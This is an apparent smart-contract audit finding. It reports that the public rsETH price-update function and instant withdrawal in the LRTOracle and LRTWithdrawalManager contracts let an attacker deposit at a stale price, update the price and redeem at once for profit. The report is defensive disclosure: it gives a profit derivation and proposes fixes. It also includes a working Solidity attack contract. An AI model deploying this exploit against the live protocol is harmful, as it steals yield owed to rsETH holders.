Audit Report

## Title
Oracle Price Sandwich via Public `updateRSETHPrice()` and `instantWithdrawal()` Enables Yield Theft - (File: contracts/LRTOracle.sol, contracts/LRTWithdrawalManager.sol)

## Summary

`LRTOracle.updateRSETHPrice()` is a permissionless public function with no caller restriction. Because `instantWithdrawal()` prices redemptions using the live stored `rsETHPrice` at execution time, an attacker can atomically deposit at the stale pre-update price, trigger the price update to reflect accumulated rewards, and immediately redeem at the higher post-update price — extracting yield that belongs to existing rsETH holders.

## Finding Description

`LRTOracle.updateRSETHPrice()` is declared `public` with only a `whenNotPaused` guard:

```solidity
// contracts/LRTOracle.sol L87-89
function updateRSETHPrice() public whenNotPaused {
    _updateRsETHPrice();
}
```

The stored `rsETHPrice` is the sole pricing source for both minting and redemption. `LRTDepositPool.getRsETHAmountToMint()` computes rsETH to mint as:

```solidity
// contracts/LRTDepositPool.sol L520
rsethAmountToMint = (amount * lrtOracle.getAssetPrice(asset)) / lrtOracle.rsETHPrice();
```

`LRTWithdrawalManager.getExpectedAssetAmount()` computes the redemption payout as:

```solidity
// contracts/LRTWithdrawalManager.sol L593
underlyingToReceive = amount * lrtOracle.rsETHPrice() / lrtOracle.getAssetPrice(asset);
```

`instantWithdrawal()` calls `getExpectedAssetAmount()` at execution time using the live stored price, burns rsETH, and immediately redeems from the unstaking vault with no time-lock or same-block restriction:

```solidity
// contracts/LRTWithdrawalManager.sol L228-235
uint256 assetAmountUnlocked = getExpectedAssetAmount(asset, rsETHUnstaked);
IRSETH(lrtConfig.rsETH()).burnFrom(address(msg.sender), rsETHUnstaked);
...
unstakingVault.redeem(asset, assetAmountUnlocked);
```

**Mathematical proof the attack is profitable:**

Let `S` = rsETH supply, `T` = total ETH in protocol (with accumulated rewards, so `T > S * oldPrice`), `D` = attacker deposit.

After depositing `D` ETH at `oldPrice`, attacker receives `rsethMinted = D / oldPrice`. The new `previousTVL` used in `_updateRsETHPrice()` becomes `(S + D/oldPrice) * oldPrice = S*oldPrice + D`. The reward amount `totalETHInProtocol - previousTVL = (T + D) - (S*oldPrice + D) = T - S*oldPrice` — **identical to the pre-deposit reward amount**. The attacker's deposit does not dilute the reward delta.

The new price after update: `newRsETHPrice = (T + D) / (S + D/oldPrice)`. Since `T > S*oldPrice`, it follows that `newRsETHPrice > oldPrice`. The attacker then redeems `rsethMinted` at `newRsETHPrice`, receiving `(D/oldPrice) * newRsETHPrice > D` ETH.

**Profit per attack:**
```
profit ≈ D × (newRsETHPrice − oldPrice) / oldPrice − instantWithdrawalFee
```

The only partial guard is `pricePercentageLimit` at `LRTOracle.sol L252-266`: if the price increase exceeds the configured threshold, `updateRSETHPrice()` reverts for non-managers. However, this does not prevent the attack when (a) `pricePercentageLimit == 0`, or (b) accumulated rewards produce a price increase within the configured limit — which is the normal case for routine daily staking/restaking rewards (~0.01% per day, well below any reasonable 1% daily cap). The attack is repeatable every reward accrual cycle.

## Impact Explanation

**High — Theft of unclaimed yield.** Staking and EigenLayer restaking rewards that have not yet been reflected in `rsETHPrice` are captured by the attacker rather than accruing to existing rsETH holders via price appreciation. The yield is concretely extracted from the unstaking vault, which holds real ETH belonging to the protocol. This matches the allowed impact: *Theft of unclaimed yield*.

## Likelihood Explanation

**Medium.** Three conditions must hold simultaneously:

1. `isInstantWithdrawalEnabled[asset]` is `true` — a deliberate protocol feature set by the manager.
2. The unstaking vault holds sufficient ETH for instant redemption — routinely satisfied during normal operation.
3. The accumulated reward delta exceeds the `instantWithdrawalFee` (max 10%, typically much lower) — satisfied after any meaningful reward accrual window.

No privileged access is required. No front-running of another user's transaction is needed. The attacker fully controls all three steps atomically in a single transaction. The attack is repeatable every time rewards accumulate.

## Recommendation

1. **Auto-refresh price on deposit and instant withdrawal**: Call `_updateRsETHPrice()` internally at the start of `depositETH()` and `instantWithdrawal()` so both operations use the same up-to-date price within the same block, eliminating the stale-price arbitrage window.
2. **Minimum holding period**: Track a `mintBlock` per user and require that rsETH used in `instantWithdrawal()` was not minted in the same block, preventing atomic sandwich execution.
3. **Slippage guard on instant withdrawal**: Accept a `maxAssetAmountExpected` parameter in `instantWithdrawal()` and revert if the computed payout exceeds the caller-specified bound, preventing profit from a price jump the attacker triggered.

## Proof of Concept

```solidity
// SPDX-License-Identifier: MIT
pragma solidity 0.8.27;

interface IDepositPool {
    function depositETH(uint256 minRSETHAmountExpected, string calldata referralId) external payable;
}
interface IOracle {
    function updateRSETHPrice() external;
}
interface IWithdrawalManager {
    function instantWithdrawal(address asset, uint256 rsETHUnstaked, string calldata referralId) external;
}
interface IRSETH {
    function balanceOf(address) external view returns (uint256);
    function approve(address, uint256) external returns (bool);
}

contract OracleSandwichAttack {
    address constant ETH_TOKEN = 0xEeeeeEeeeEeEeeEeEeEeeEEEeeeeEeeeeeeeEEeE;

    function attack(
        address depositPool,
        address oracle,
        address withdrawalManager,
        address rsETH
    ) external payable {
        // Step 1: Deposit at stale rsETHPrice — receive more rsETH than true NAV
        IDepositPool(depositPool).depositETH{value: msg.value}(0, "");

        // Step 2: Trigger price update — rsETHPrice increases to reflect accumulated rewards
        IOracle(oracle).updateRSETHPrice();

        // Step 3: Instantly withdraw at the new higher price
        uint256 rsETHBalance = IRSETH(rsETH).balanceOf(address(this));
        IRSETH(rsETH).approve(withdrawalManager, rsETHBalance);
        IWithdrawalManager(withdrawalManager).instantWithdrawal(ETH_TOKEN, rsETHBalance, "");

        // address(this).balance > msg.value (minus instantWithdrawalFee)
        payable(msg.sender).transfer(address(this).balance);
    }

    receive() external payable {}
}
```

**Foundry fork test plan**: Fork mainnet, impersonate a whale, call `attack()` with a large ETH value after a reward accrual period. Assert `address(attacker).balance > initialBalance` and that `rsETHPrice` increased between steps 1 and 3. Fuzz over `depositAmount` and `timeSinceLastUpdate` to characterize the profit curve.